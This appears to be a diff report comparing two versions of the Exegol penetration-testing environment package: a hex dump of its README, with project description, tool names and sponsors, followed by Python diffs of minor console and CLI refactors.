+00000960: 733a 2f2f 696d 672e 7368 6965 6c64 732e  s://img.shields.
+00000970: 696f 2f62 6164 6765 2f61 6d64 3634 2532  io/badge/amd64%2
+00000980: 3028 7838 365f 5f36 3429 2d73 7570 706f  0(x86__64)-suppo
+00000990: 7274 6564 2d73 7563 6365 7373 223e 0a20  rted-success">. 
+000009a0: 203c 696d 6720 616c 743d 2261 726d 3634   <img alt="arm64
+000009b0: 2220 7372 633d 2268 7474 7073 3a2f 2f69  " src="https://i
+000009c0: 6d67 2e73 6869 656c 6473 2e69 6f2f 6261  mg.shields.io/ba
+000009d0: 6467 652f 6172 6d36 3425 3230 2861 6172  dge/arm64%20(aar
+000009e0: 6368 3634 292d 7375 7070 6f72 7465 642d  ch64)-supported-
+000009f0: 7375 6363 6573 7322 3e0a 2020 3c62 723e  success">.  <br>
+00000a00: 3c62 723e 0a20 203c 6120 7461 7267 6574  <br>.  <a target
+00000a10: 3d22 5f62 6c61 6e6b 2220 7265 6c3d 226e  ="_blank" rel="n
+00000a20: 6f6f 7065 6e65 7220 6e6f 7265 6665 7272  oopener noreferr
+00000a30: 6572 2220 6872 6566 3d22 6874 7470 733a  er" href="https:
+00000a40: 2f2f 7477 6974 7465 722e 636f 6d2f 696e  //twitter.com/in
+00000a50: 7465 6e74 2f66 6f6c 6c6f 773f 7363 7265  tent/follow?scre
+00000a60: 656e 5f6e 616d 653d 5f6e 776f 6474 7568  en_name=_nwodtuh
+00000a70: 7322 2074 6974 6c65 3d22 466f 6c6c 6f77  s" title="Follow
+00000a80: 223e 3c69 6d67 2073 7263 3d22 6874 7470  "><img src="http
+00000a90: 733a 2f2f 696d 672e 7368 6965 6c64 732e  s://img.shields.
+00000aa0: 696f 2f74 7769 7474 6572 2f66 6f6c 6c6f  io/twitter/follo
+00000ab0: 772f 5f6e 776f 6474 7568 733f 6c61 6265  w/_nwodtuhs?labe
+00000ac0: 6c3d 5368 7574 646f 776e 2673 7479 6c65  l=Shutdown&style
+00000ad0: 3d73 6f63 6961 6c22 2061 6c74 3d22 5477  =social" alt="Tw
+00000ae0: 6974 7465 7220 5368 7574 646f 776e 223e  itter Shutdown">
+00000af0: 3c2f 613e 0a20 203c 6120 7461 7267 6574  </a>.  <a target
+00000b00: 3d22 5f62 6c61 6e6b 2220 7265 6c3d 226e  ="_blank" rel="n
+00000b10: 6f6f 7065 6e65 7220 6e6f 7265 6665 7272  oopener noreferr
+00000b20: 6572 2220 6872 6566 3d22 6874 7470 733a  er" href="https:
+00000b30: 2f2f 7477 6974 7465 722e 636f 6d2f 696e  //twitter.com/in
+00000b40: 7465 6e74 2f66 6f6c 6c6f 773f 7363 7265  tent/follow?scre
+00000b50: 656e 5f6e 616d 653d 4472 616d 656c 6163  en_name=Dramelac
+00000b60: 5f22 2074 6974 6c65 3d22 466f 6c6c 6f77  _" title="Follow
+00000b70: 223e 3c69 6d67 2073 7263 3d22 6874 7470  "><img src="http
+00000b80: 733a 2f2f 696d 672e 7368 6965 6c64 732e  s://img.shields.
+00000b90: 696f 2f74 7769 7474 6572 2f66 6f6c 6c6f  io/twitter/follo
+00000ba0: 772f 4472 616d 656c 6163 5f3f 6c61 6265  w/Dramelac_?labe
+00000bb0: 6c3d 4472 616d 656c 6163 2673 7479 6c65  l=Dramelac&style
+00000bc0: 3d73 6f63 6961 6c22 2061 6c74 3d22 5477  =social" alt="Tw
+00000bd0: 6974 7465 7220 4472 616d 656c 6163 223e  itter Dramelac">
+00000be0: 3c2f 613e 0a20 203c 6272 3e0a 2020 3c61  </a>.  <br>.  <a
+00000bf0: 2074 6172 6765 743d 225f 626c 616e 6b22   target="_blank"
+00000c00: 2072 656c 3d22 6e6f 6f70 656e 6572 206e   rel="noopener n
+00000c10: 6f72 6566 6572 7265 7222 2068 7265 663d  oreferrer" href=
+00000c20: 2268 7474 7073 3a2f 2f77 7777 2e62 6c61  "https://www.bla
+00000c30: 636b 6861 742e 636f 6d2f 6575 2d32 322f  ckhat.com/eu-22/
+00000c40: 6172 7365 6e61 6c2f 7363 6865 6475 6c65  arsenal/schedule
+00000c50: 2f69 6e64 6578 2e68 746d 6c23 6578 6567  /index.html#exeg
+00000c60: 6f6c 2d32 3931 3830 2220 7469 746c 653d  ol-29180" title=
+00000c70: 2253 6368 6564 756c 6522 3e0a 2020 203c  "Schedule">.   <
+00000c80: 696d 6720 616c 743d 2242 6c61 636b 2048  img alt="Black H
+00000c90: 6174 2045 7572 6f70 6520 3230 3232 2220  at Europe 2022" 
+00000ca0: 7372 633d 2268 7474 7073 3a2f 2f69 6d67  src="https://img
+00000cb0: 2e73 6869 656c 6473 2e69 6f2f 6261 6467  .shields.io/badg
+00000cc0: 652f 426c 6163 6b25 3230 4861 7425 3230  e/Black%20Hat%20
+00000cd0: 4172 7365 6e61 6c2d 4575 726f 7065 2532  Arsenal-Europe%2
+00000ce0: 3032 3032 322d 626c 7565 7669 6f6c 6574  02022-blueviolet
+00000cf0: 223e 0a20 203c 2f61 3e0a 2020 3c61 2074  ">.  </a>.  <a t
+00000d00: 6172 6765 743d 225f 626c 616e 6b22 2072  arget="_blank" r
+00000d10: 656c 3d22 6e6f 6f70 656e 6572 206e 6f72  el="noopener nor
+00000d20: 6566 6572 7265 7222 2068 7265 663d 2268  eferrer" href="h
+00000d30: 7474 7073 3a2f 2f77 7777 2e62 6c61 636b  ttps://www.black
+00000d40: 6861 742e 636f 6d2f 6173 6961 2d32 332f  hat.com/asia-23/
+00000d50: 6172 7365 6e61 6c2f 7363 6865 6475 6c65  arsenal/schedule
+00000d60: 2f23 6578 6567 6f6c 2d70 726f 6665 7373  /#exegol-profess
+00000d70: 696f 6e61 6c2d 6861 636b 696e 672d 7365  ional-hacking-se
+00000d80: 7475 702d 3330 3831 3522 2074 6974 6c65  tup-30815" title
+00000d90: 3d22 5363 6865 6475 6c65 223e 0a20 2020  ="Schedule">.   
+00000da0: 3c69 6d67 2061 6c74 3d22 426c 6163 6b20  <img alt="Black 
+00000db0: 4861 7420 4173 6961 2032 3032 3322 2073  Hat Asia 2023" s
+00000dc0: 7263 3d22 6874 7470 733a 2f2f 696d 672e  rc="https://img.
+00000dd0: 7368 6965 6c64 732e 696f 2f62 6164 6765  shields.io/badge
+00000de0: 2f42 6c61 636b 2532 3048 6174 2532 3041  /Black%20Hat%20A
+00000df0: 7273 656e 616c 2d41 7369 6125 3230 3230  rsenal-Asia%2020
+00000e00: 3233 2d62 6c75 6576 696f 6c65 7422 3e0a  23-blueviolet">.
+00000e10: 2020 3c2f 613e 0a20 203c 6272 3e3c 6272    </a>.  <br><br
+00000e20: 3e0a 2020 3c61 2074 6172 6765 743d 225f  >.  <a target="_
+00000e30: 626c 616e 6b22 2072 656c 3d22 6e6f 6f70  blank" rel="noop
+00000e40: 656e 6572 206e 6f72 6566 6572 7265 7222  ener noreferrer"
+00000e50: 2068 7265 663d 2268 7474 7073 3a2f 2f64   href="https://d
+00000e60: 6973 636f 7264 2e67 672f 6358 5468 7970  iscord.gg/cXThyp
+00000e70: 3744 3650 2220 7469 746c 653d 224a 6f69  7D6P" title="Joi
+00000e80: 6e20 7573 206f 6e20 4469 7363 6f72 6422  n us on Discord"
+00000e90: 3e3c 696d 6720 7372 633d 2268 7474 7073  ><img src="https
+00000ea0: 3a2f 2f72 6177 2e67 6974 6875 6275 7365  ://raw.githubuse
+00000eb0: 7263 6f6e 7465 6e74 2e63 6f6d 2f54 6865  rcontent.com/The
+00000ec0: 506f 7267 732f 4578 6567 6f6c 2d64 6f63  Porgs/Exegol-doc
+00000ed0: 732f 6d61 696e 2f2e 6173 7365 7473 2f64  s/main/.assets/d
+00000ee0: 6973 636f 7264 5f6a 6f69 6e5f 7573 2e70  iscord_join_us.p
+00000ef0: 6e67 2220 7769 6474 683d 2231 3530 2220  ng" width="150" 
+00000f00: 616c 743d 224a 6f69 6e20 7573 206f 6e20  alt="Join us on 
+00000f10: 4469 7363 6f72 6422 3e3c 2f61 3e0a 2020  Discord"></a>.  
+00000f20: 3c62 723e 3c62 723e 0a3c 2f64 6976 3e0a  <br><br>.</div>.
+00000f30: 0a3e 2045 7865 676f 6c20 6973 2061 2063  .> Exegol is a c
+00000f40: 6f6d 6d75 6e69 7479 2d64 7269 7665 6e20  ommunity-driven 
+00000f50: 6861 636b 696e 6720 656e 7669 726f 6e6d  hacking environm
+00000f60: 656e 742c 2070 6f77 6572 6675 6c20 616e  ent, powerful an
+00000f70: 6420 7965 7420 7369 6d70 6c65 2065 6e6f  d yet simple eno
+00000f80: 7567 6820 746f 2062 6520 7573 6564 2062  ugh to be used b
+00000f90: 7920 616e 796f 6e65 2069 6e20 6461 7920  y anyone in day 
+00000fa0: 746f 2064 6179 2065 6e67 6167 656d 656e  to day engagemen
+00000fb0: 7473 2e20 4578 6567 6f6c 2069 7320 7468  ts. Exegol is th
+00000fc0: 6520 6265 7374 2073 6f6c 7574 696f 6e20  e best solution 
+00000fd0: 746f 2064 6570 6c6f 7920 706f 7765 7266  to deploy powerf
+00000fe0: 756c 2068 6163 6b69 6e67 2065 6e76 6972  ul hacking envir
+00000ff0: 6f6e 6d65 6e74 7320 7365 6375 7265 6c79  onments securely
+00001000: 2c20 6561 7369 6c79 2c20 7072 6f66 6573  , easily, profes
+00001010: 7369 6f6e 616c 6c79 2e0a 3e20 4578 6567  sionally..> Exeg
+00001020: 6f6c 2066 6974 7320 7065 6e74 6573 7465  ol fits penteste
+00001030: 7273 2c20 4354 4620 706c 6179 6572 732c  rs, CTF players,
+00001040: 2062 7567 2062 6f75 6e74 7920 6875 6e74   bug bounty hunt
+00001050: 6572 732c 2072 6573 6561 7263 6865 7273  ers, researchers
+00001060: 2c20 6265 6769 6e6e 6572 7320 616e 6420  , beginners and 
+00001070: 6164 7661 6e63 6564 2075 7365 7273 2c20  advanced users, 
+00001080: 6465 6665 6e64 6572 732c 2066 726f 6d20  defenders, from 
+00001090: 7374 796c 6973 6820 6d61 634f 5320 7573  stylish macOS us
+000010a0: 6572 7320 616e 6420 636f 7270 6f72 6174  ers and corporat
+000010b0: 6520 5769 6e64 6f77 7320 7072 6f73 2074  e Windows pros t
+000010c0: 6f20 554e 4958 2d6c 696b 6520 706f 7765  o UNIX-like powe
+000010d0: 7220 7573 6572 732e 0a0a 2320 4765 7474  r users...# Gett
+000010e0: 696e 6720 7374 6172 7465 640a 0a59 6f75  ing started..You
+000010f0: 2063 616e 2072 6566 6572 2074 6f20 7468   can refer to th
+00001100: 6520 5b45 7865 676f 6c20 646f 6375 6d65  e [Exegol docume
+00001110: 6e74 6174 696f 6e73 5d28 6874 7470 733a  ntations](https:
+00001120: 2f2f 6578 6567 6f6c 2e72 6561 6474 6865  //exegol.readthe
+00001130: 646f 6373 2e69 6f2f 656e 2f6c 6174 6573  docs.io/en/lates
+00001140: 742f 6765 7474 696e 672d 7374 6172 7465  t/getting-starte
+00001150: 642f 696e 7374 616c 6c2e 6874 6d6c 292e  d/install.html).
+00001160: 0a0a 3e20 4675 6c6c 2064 6f63 756d 656e  ..> Full documen
+00001170: 7461 7469 6f6e 2068 6f6d 6570 6167 653a  tation homepage:
+00001180: 2068 7474 7073 3a2f 2f65 7865 676f 6c2e   https://exegol.
+00001190: 7274 6664 2e69 6f2f 2e0a 0a23 2320 5072  rtfd.io/...## Pr
+000011a0: 6f6a 6563 7420 7374 7275 6374 7572 650a  oject structure.
+000011b0: 0a42 656c 6f77 2061 7265 2073 6f6d 6520  .Below are some 
+000011c0: 6275 6c6c 6574 2070 6f69 6e74 7320 746f  bullet points to
+000011d0: 2062 6574 7465 7220 756e 6465 7273 7461   better understa
+000011e0: 6e64 2068 6f77 2045 7865 676f 6c20 776f  nd how Exegol wo
+000011f0: 726b 730a 2d20 5468 6973 2072 6570 6f73  rks.- This repos
+00001200: 6974 6f72 7920 285b 4578 6567 6f6c 5d28  itory ([Exegol](
+00001210: 6874 7470 733a 2f2f 6769 7468 7562 2e63  https://github.c
+00001220: 6f6d 2f54 6865 506f 7267 732f 4578 6567  om/ThePorgs/Exeg
+00001230: 6f6c 2929 2063 6f6e 7461 696e 7320 7468  ol)) contains th
+00001240: 6520 636f 6465 2066 6f72 2074 6865 2050  e code for the P
+00001250: 7974 686f 6e20 7772 6170 7065 722e 2049  ython wrapper. I
+00001260: 7427 7320 7468 6520 656e 7472 7970 6f69  t's the entrypoi
+00001270: 6e74 206f 6620 7468 6520 4578 6567 6f6c  nt of the Exegol
+00001280: 2070 726f 6a65 6374 2e20 5468 6520 7772   project. The wr
+00001290: 6170 7065 7220 6361 6e20 6265 2069 6e73  apper can be ins
+000012a0: 7461 6c6c 6564 2066 726f 6d20 736f 7572  talled from sour
+000012b0: 6365 732c 2062 7574 205b 6120 5079 5049  ces, but [a PyPI
+000012c0: 2070 6163 6b61 6765 5d28 6874 7470 733a   package](https:
+000012d0: 2f2f 7079 7069 2e6f 7267 2f70 726f 6a65  //pypi.org/proje
+000012e0: 6374 2f45 7865 676f 6c2f 2920 6973 2061  ct/Exegol/) is a
+000012f0: 7661 696c 6162 6c65 2e0a 2d20 5468 6520  vailable..- The 
+00001300: 5b45 7865 676f 6c2d 696d 6167 6573 5d28  [Exegol-images](
+00001310: 6874 7470 733a 2f2f 6769 7468 7562 2e63  https://github.c
+00001320: 6f6d 2f54 6865 506f 7267 732f 4578 6567  om/ThePorgs/Exeg
+00001330: 6f6c 2d69 6d61 6765 7329 2072 6570 6f20  ol-images) repo 
+00001340: 6973 206c 6f61 6465 6420 6173 2061 2073  is loaded as a s
+00001350: 7562 6d6f 6475 6c65 2e20 4974 2069 6e63  ubmodule. It inc
+00001360: 6c75 6465 7320 616c 6c20 6e65 6365 7373  ludes all necess
+00001370: 6172 7920 6173 7365 7473 2074 6f20 6275  ary assets to bu
+00001380: 696c 6420 446f 636b 6572 2069 6d61 6765  ild Docker image
+00001390: 732e 204e 6f74 6162 656e 653a 2074 6865  s. Notabene: the
+000013a0: 2069 6d61 6765 2061 7265 2061 6c72 6561   image are alrea
+000013b0: 6479 2062 7569 6c74 2061 6e64 206f 6666  dy built and off
+000013c0: 6572 6564 206f 6e20 5b74 6865 206f 6666  ered on [the off
+000013d0: 6963 6961 6c20 446f 636b 6572 6875 6220  icial Dockerhub 
+000013e0: 7265 6769 7374 7279 5d28 6874 7470 733a  registry](https:
+000013f0: 2f2f 6875 622e 646f 636b 6572 2e63 6f6d  //hub.docker.com
+00001400: 2f72 6570 6f73 6974 6f72 792f 646f 636b  /repository/dock
+00001410: 6572 2f6e 776f 6474 7568 732f 6578 6567  er/nwodtuhs/exeg
+00001420: 6f6c 292e 0a2d 2054 6865 205b 4578 6567  ol)..- The [Exeg
+00001430: 6f6c 2d72 6573 6f75 7263 6573 5d28 6874  ol-resources](ht
+00001440: 7470 733a 2f2f 6769 7468 7562 2e63 6f6d  tps://github.com
+00001450: 2f54 6865 506f 7267 732f 4578 6567 6f6c  /ThePorgs/Exegol
+00001460: 2d72 6573 6f75 7263 6573 2920 7265 706f  -resources) repo
+00001470: 2069 7320 6c6f 6164 6564 2061 7320 6120   is loaded as a 
+00001480: 7375 626d 6f64 756c 652e 2049 7420 696e  submodule. It in
+00001490: 636c 7564 6573 2061 6c6c 2072 6573 6f75  cludes all resou
+000014a0: 7263 6573 206d 656e 7469 6f6e 6564 2070  rces mentioned p
+000014b0: 7265 7669 6f75 736c 7920 284c 696e 5045  reviously (LinPE
+000014c0: 4153 2c20 5769 6e50 4541 532c 204c 696e  AS, WinPEAS, Lin
+000014d0: 456e 756d 2c20 5072 6976 6573 6343 6865  Enum, PrivescChe
+000014e0: 636b 2c20 5379 7369 6e74 6572 6e61 6c73  ck, Sysinternals
+000014f0: 5375 6974 652c 206d 696d 696b 6174 7a2c  Suite, mimikatz,
+00001500: 2052 7562 6575 732c 2050 6f77 6572 5370   Rubeus, PowerSp
+00001510: 6c6f 6974 2061 6e64 206d 616e 7920 6d6f  loit and many mo
+00001520: 7265 2e29 2e0a 2d20 5468 6520 5b45 7865  re.)..- The [Exe
+00001530: 676f 6c2d 646f 6373 5d28 6874 7470 733a  gol-docs](https:
+00001540: 2f2f 6769 7468 7562 2e63 6f6d 2f54 6865  //github.com/The
+00001550: 506f 7267 732f 4578 6567 6f6c 2d64 6f63  Porgs/Exegol-doc
+00001560: 7329 2072 6570 6f20 666f 7220 7468 6520  s) repo for the 
+00001570: 646f 6375 6d65 6e74 6174 696f 6e2c 2064  documentation, d
+00001580: 6573 7469 6e65 6420 666f 7220 7573 6572  estined for user
+00001590: 7320 6173 2077 656c 6c20 6173 2064 6576  s as well as dev
+000015a0: 656c 6f70 7065 7273 2061 6e64 2063 6f6e  eloppers and con
+000015b0: 7472 6962 7574 6f72 732e 2054 6865 2047  tributors. The G
+000015c0: 6974 4875 6220 7265 706f 2068 6f6c 6473  itHub repo holds
+000015d0: 2074 6865 2073 6f75 7263 6573 2074 6861   the sources tha
+000015e0: 7420 6172 6520 636f 6d70 696c 6564 206f  t are compiled o
+000015f0: 6e20 6874 7470 733a 2f2f 6578 6567 6f6c  n https://exegol
+00001600: 2e72 6561 6474 6865 646f 6373 2e69 6f2f  .readthedocs.io/
+00001610: 2e0a 0a23 2053 706f 6e73 6f72 730a 0a3c  ...# Sponsors..<
+00001620: 6469 7620 616c 6967 6e3d 2263 656e 7465  div align="cente
+00001630: 7222 3e0a 2020 3c61 2068 7265 663d 2268  r">.  <a href="h
+00001640: 7474 7073 3a2f 2f77 7777 2e63 6170 6765  ttps://www.capge
+00001650: 6d69 6e69 2e63 6f6d 2f22 2074 6974 6c65  mini.com/" title
+00001660: 3d22 466f 6c6c 6f77 223e 0a20 2020 203c  ="Follow">.    <
+00001670: 696d 6720 7769 6474 683d 2233 3030 2220  img width="300" 
+00001680: 7372 633d 2268 7474 7073 3a2f 2f75 706c  src="https://upl
+00001690: 6f61 642e 7769 6b69 6d65 6469 612e 6f72  oad.wikimedia.or
+000016a0: 672f 7769 6b69 7065 6469 612f 6672 2f74  g/wikipedia/fr/t
+000016b0: 6875 6d62 2f62 2f62 352f 4361 7067 656d  humb/b/b5/Capgem
+000016c0: 696e 695f 4c6f 676f 2e73 7667 2f31 3238  ini_Logo.svg/128
+000016d0: 3070 782d 4361 7067 656d 696e 695f 4c6f  0px-Capgemini_Lo
+000016e0: 676f 2e73 7667 2e70 6e67 223e 0a20 203c  go.svg.png">.  <
+000016f0: 2f61 3e0a 3c2f 6469 763e 0a0a 4472 616d  /a>.</div>..Dram
+00001700: 656c 6163 2061 6e64 2049 2077 6f72 6b20  elac and I work 
+00001710: 6174 202a 4361 7067 656d 696e 692a 2061  at *Capgemini* a
+00001720: 6e64 2077 6520 7468 616e 6b20 7468 656d  nd we thank them
+00001730: 2066 6f72 2061 6c6c 6f63 6174 696e 6720   for allocating 
+00001740: 736f 6d65 2074 696d 6520 666f 7220 7573  some time for us
+00001750: 2074 6f20 6465 7665 6c6f 7020 616e 6420   to develop and 
+00001760: 6d61 696e 7461 696e 2045 7865 676f 6c21  maintain Exegol!
+00001770: 2056 6973 6974 2043 6170 6765 6d69 6e69   Visit Capgemini
+00001780: 2077 6562 7369 7465 2061 7420 6874 7470   website at http
+00001790: 733a 2f2f 7777 772e 6361 7067 656d 696e  s://www.capgemin
+000017a0: 692e 636f 6d2f 2e0a 0a5f 5f5f 0a0a 3c64  i.com/...___..<d
+000017b0: 6976 2061 6c69 676e 3d22 6365 6e74 6572  iv align="center
+000017c0: 223e 0a20 203c 6120 6872 6566 3d22 6874  ">.  <a href="ht
+000017d0: 7470 733a 2f2f 7777 772e 6861 636b 7468  tps://www.hackth
+000017e0: 6562 6f78 2e63 6f6d 2f22 2074 6974 6c65  ebox.com/" title
+000017f0: 3d22 466f 6c6c 6f77 223e 0a20 2020 203c  ="Follow">.    <
+00001800: 696d 6720 7769 6474 683d 2233 3030 2220  img width="300" 
+00001810: 7372 633d 2268 7474 7073 3a2f 2f65 7865  src="https://exe
+00001820: 676f 6c2e 7265 6164 7468 6564 6f63 732e  gol.readthedocs.
+00001830: 696f 2f65 6e2f 6c61 7465 7374 2f5f 696d  io/en/latest/_im
+00001840: 6167 6573 2f68 6163 6b74 6865 626f 782e  ages/hackthebox.
+00001850: 706e 6722 3e0a 2020 3c2f 613e 0a3c 2f64  png">.  </a>.</d
+00001860: 6976 3e0a 0a57 6520 616c 736f 2074 6861  iv>..We also tha
+00001870: 6e6b 202a 4861 636b 5468 6542 6f78 2a20  nk *HackTheBox* 
+00001880: 666f 7220 636f 6e74 696e 756f 7573 6c79  for continuously
+00001890: 2073 7570 706f 7274 696e 6720 7468 6520   supporting the 
+000018a0: 636f 6d6d 756e 6974 7920 616e 6420 666f  community and fo
+000018b0: 7220 6865 6c70 696e 6720 7573 2066 696e  r helping us fin
+000018c0: 616e 6369 616c 6c79 2074 6f20 6163 7175  ancially to acqu
+000018d0: 6972 6520 7468 6520 6e65 6365 7373 6172  ire the necessar
+000018e0: 7920 6861 7264 7761 7265 2066 6f72 2073  y hardware for s
+000018f0: 7570 706f 7274 696e 6720 6d75 6c74 6970  upporting multip
+00001900: 6c65 2061 7263 6869 7465 6374 7572 6573  le architectures
+00001910: 2028 414d 4436 342c 2041 524d 3634 292e   (AMD64, ARM64).
+00001920: 2053 686f 7720 736f 6d65 206c 6f76 6520   Show some love 
+00001930: 6174 2068 7474 7073 3a2f 2f77 7777 2e68  at https://www.h
+00001940: 6163 6b74 6865 626f 782e 636f 6d2f 2021  ackthebox.com/ !
+00001950: 0a0a                                     ..
```

### Comparing `Exegol-4.1.1/exegol/console/ConsoleFormat.py` & `Exegol-4.2.0/exegol/console/ConsoleFormat.py`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol/console/LayerTextColumn.py` & `Exegol-4.2.0/exegol/console/LayerTextColumn.py`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol/console/TUI.py` & `Exegol-4.2.0/exegol/console/TUI.py`

 * *Files 2% similar despite different names*

```diff
@@ -3,24 +3,25 @@
 from typing import Union, Optional, List, Dict, Type, Generator, Set, cast, Sequence, Tuple
 
 from rich import box
 from rich.progress import TextColumn, BarColumn, TransferSpeedColumn, TimeElapsedColumn, TimeRemainingColumn, TaskID
 from rich.prompt import Prompt
 from rich.table import Table
 
+from exegol.console import ConsoleFormat
 from exegol.console.ConsoleFormat import boolFormatter, getColor, richLen
 from exegol.console.ExegolProgress import ExegolProgress
 from exegol.console.ExegolPrompt import Confirm
 from exegol.console.LayerTextColumn import LayerTextColumn
 from exegol.console.cli.ParametersManager import ParametersManager
 from exegol.model.ExegolContainer import ExegolContainer
 from exegol.model.ExegolContainerTemplate import ExegolContainerTemplate
 from exegol.model.ExegolImage import ExegolImage
 from exegol.model.SelectableInterface import SelectableInterface
-from exegol.utils.EnvInfo import EnvInfo
+from exegol.config.EnvInfo import EnvInfo
 from exegol.utils.ExeLog import logger, console, ExeLog
 
 
 class ExegolTUI:
     """Class gathering different methods of Terminal User Interface (or TUI)"""
 
     @staticmethod
@@ -233,22 +234,22 @@
             table.add_column("Mounts")
             table.add_column("Devices")
             table.add_column("Ports")
             table.add_column("Envs")
         # Load data into the table
         for container in data:
             if verbose_mode:
-                table.add_row(container.getId(), container.name, container.getTextStatus(), container.image.getDisplayName(),
+                table.add_row(container.getId(), container.getDisplayName(), container.getTextStatus(), container.image.getDisplayName(),
                               container.config.getTextFeatures(verbose_mode),
                               container.config.getTextMounts(debug_mode),
                               container.config.getTextDevices(debug_mode),
                               container.config.getTextPorts(),
                               container.config.getTextEnvs(debug_mode))
             else:
-                table.add_row(container.name, container.getTextStatus(), container.image.getDisplayName(),
+                table.add_row(container.getDisplayName(), container.getTextStatus(), container.image.getDisplayName(),
                               container.config.getTextFeatures(verbose_mode))
 
     @staticmethod
     def __buildStringTable(table: Table, data: Sequence[str], title: str = "Key"):
         """Building a simple Rich table from a list of string"""
         table.title = title
         table.min_width = richLen(title)
@@ -338,15 +339,15 @@
                 logger.info(f"[red]Please select one of the available {object_name}s[/red]")
             else:
                 logger.critical(f"Unknown error, cannot fetch selected object.")
 
     @classmethod
     def multipleSelectFromTable(cls,
                                 data: Sequence[SelectableInterface],
-                                object_type: Type = None,
+                                object_type: Optional[Type] = None,
                                 default: Optional[str] = None) -> Sequence[SelectableInterface]:
         """Return a list of object (implementing SelectableInterface) selected by the user
         Raise IndexError of the data list is empty."""
         cls.__isInteractionAllowed()
         result = []
         pool = cast(List[SelectableInterface], data).copy()
         if object_type is None and len(pool) > 0:
@@ -401,33 +402,37 @@
         devices = container.config.getTextDevices(logger.isEnabledFor(ExeLog.VERBOSE))
         envs = container.config.getTextEnvs(logger.isEnabledFor(ExeLog.VERBOSE))
         ports = container.config.getTextPorts()
         sysctls = container.config.getSysctls()
         capabilities = container.config.getCapabilities()
         volumes = container.config.getTextMounts(logger.isEnabledFor(ExeLog.VERBOSE))
         creation_date = container.config.getTextCreationDate()
+        comment = container.config.getComment()
 
         # Color code
         privilege_color = "bright_magenta"
         path_color = "magenta"
 
         logger.empty_line()
         recap = Table(border_style="grey35", box=box.SQUARE, title_justify="left", show_header=True)
         recap.title = "[not italic]:white_medium_star: [/not italic][gold3][g]Container summary[/g][/gold3]"
         # Header
         recap.add_column(f"[bold blue]Name[/bold blue]{os.linesep}[bold blue]Image[/bold blue]", justify="right")
-        container_info_header = f"{container.name}{os.linesep}{container.image.getName()}"
+        container_info_header = f"{container.getDisplayName()}{os.linesep}{container.image.getName()}"
         if "N/A" not in container.image.getImageVersion():
             container_info_header += f" - v.{container.image.getImageVersion()}"
         if "Unknown" not in container.image.getStatus():
             container_info_header += f" ({container.image.getStatus(include_version=False)})"
         if container.image.getArch() != EnvInfo.arch or logger.isEnabledFor(ExeLog.VERBOSE):
-            container_info_header += f" [bright_black]({container.image.getArch()})[/bright_black]"
+            color = ConsoleFormat.getArchColor(container.image.getArch())
+            container_info_header += f" [{color}]({container.image.getArch()})[/{color}]"
         recap.add_column(container_info_header)
         # Main features
+        if comment:
+            recap.add_row("[bold blue]Comment[/bold blue]", comment)
         if creation_date:
             recap.add_row("[bold blue]Creation date[/bold blue]", creation_date)
         recap.add_row("[bold blue]GUI[/bold blue]", boolFormatter(container.config.isGUIEnable()))
         recap.add_row("[bold blue]Network[/bold blue]", container.config.getTextNetworkMode())
         recap.add_row("[bold blue]Timezone[/bold blue]", boolFormatter(container.config.isTimezoneShared()))
         recap.add_row("[bold blue]Exegol resources[/bold blue]", boolFormatter(container.config.isExegolResourcesEnable()) +
                       f"{'[bright_black](/opt/resources)[/bright_black]' if container.config.isExegolResourcesEnable() else ''}")
```

### Comparing `Exegol-4.1.1/exegol/console/cli/ParametersManager.py` & `Exegol-4.2.0/exegol/console/cli/ParametersManager.py`

 * *Files 8% similar despite different names*

```diff
@@ -50,7 +50,15 @@
         try:
             # If item was not found in self, the search is initiated among the parameters
             return getattr(self.parameters, item)
         except AttributeError:
             # The logger may not work if the call is made before its initialization
             logger.debug(f"Attribute not found in parameters: {item}")
             return None
+
+    def __setattr__(self, key, value) -> None:
+        """Allow to dynamically change some parameter during runtime"""
+        # Only some specific parameters are whitelisted for runtime update
+        if key in ["offline_mode"]:
+            setattr(self.parameters, key, value)
+        else:
+            super().__setattr__(key, value)
```

### Comparing `Exegol-4.1.1/exegol/console/cli/actions/Command.py` & `Exegol-4.2.0/exegol/console/cli/actions/Command.py`

 * *Files 3% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 import os
 from argparse import Namespace
 from typing import List, Optional, Tuple, Union, Dict, cast
 
 from exegol.console.ConsoleFormat import richLen
-from exegol.utils.EnvInfo import EnvInfo
+from exegol.config.EnvInfo import EnvInfo
 from exegol.utils.ExeLog import logger
 
 
 class Option:
     """This object allows to define and configure an argparse parameter"""
 
     def __init__(self, *args, dest: Optional[str] = None, **kwargs):
@@ -131,17 +131,19 @@
                 self.__setattr__(arg, vars(args)[arg])
 
     def check_parameters(self) -> List[str]:
         """This method identifies the missing required parameters"""
         missingOption = []
         for groupArg in self.groupArgs:
             for option in groupArg.options:
-                if option["required"]:
-                    if self.__dict__[option["arg"].dest] is None:
-                        missingOption.append(option["arg"].dest)
+                if option.get("required", False):
+                    data = option.get("arg")
+                    assert data is not None and type(data) is Option
+                    if data.dest is not None and self.__dict__.get(data.dest) is None:
+                        missingOption.append(data.dest)
         return missingOption
 
     def formatEpilog(self) -> str:
         epilog = "[blue]Examples:[/blue]" + os.linesep
         epilog += self._pre_usages + os.linesep
         keys_len = {}
         # Replace [.*] rich tag for line length count
```

### Comparing `Exegol-4.1.1/exegol/console/cli/actions/ExegolParameters.py` & `Exegol-4.2.0/exegol/console/cli/actions/ExegolParameters.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,70 +1,36 @@
+from exegol.console.cli.ExegolCompleter import HybridContainerImageCompleter, VoidCompleter, BuildProfileCompleter
 from exegol.console.cli.actions.Command import Command
 from exegol.console.cli.actions.GenericParameters import *
 from exegol.manager.ExegolManager import ExegolManager
 from exegol.manager.UpdateManager import UpdateManager
 from exegol.utils.ExeLog import logger
 
 
-class Start(Command, ContainerCreation, ContainerStart):
+class Start(Command, ContainerCreation, ContainerSpawnShell):
     """Automatically create, start / resume and enter an Exegol container"""
 
     def __init__(self):
         Command.__init__(self)
         ContainerCreation.__init__(self, self.groupArgs)
+        ContainerSpawnShell.__init__(self, self.groupArgs)
 
         self._usages = {
             "Start interactively a container": "exegol start",
             "Create a [blue]demo[/blue] container using [bright_blue]full[/bright_blue] image": "exegol start [blue]demo[/blue] [bright_blue]full[/bright_blue]",
             "Spawn a shell from [blue]demo[/blue] container": "exegol start [blue]demo[/blue]",
